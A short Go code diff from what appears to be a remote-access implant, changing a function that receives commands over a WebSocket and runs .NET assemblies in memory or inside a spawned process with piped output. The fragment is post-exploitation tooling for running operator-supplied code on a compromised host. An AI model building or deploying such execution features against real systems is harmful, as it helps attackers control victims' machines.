@@ -977,15 +977,11 @@ func Assembly(assemblyBytes []byte, Connection *wsc.Wsc, arguments string, unmsg
 		prog = unmsgpack.ForcePathObject("Process86").GetAsString()
 	}
 
-	// Read the file into Bytes
-
-	// Read the file into Bytes
-
 	if prog == "" {
 		InlineAssembly(assemblyBytes, Connection, arguments, unmsgpack)
 	} else {
 		fmt.Println(unmsgpack.ForcePathObject("args").GetAsString())
-		RunCreateProcessWithPipe(unmsgpack.ForcePathObject("Bin").GetAsBytes(), prog, ""+unmsgpack.ForcePathObject("args").GetAsString(), Connection)
+		RunCreateProcessWithPipe(assemblyBytes, prog, "", Connection)
 	}
 }
 
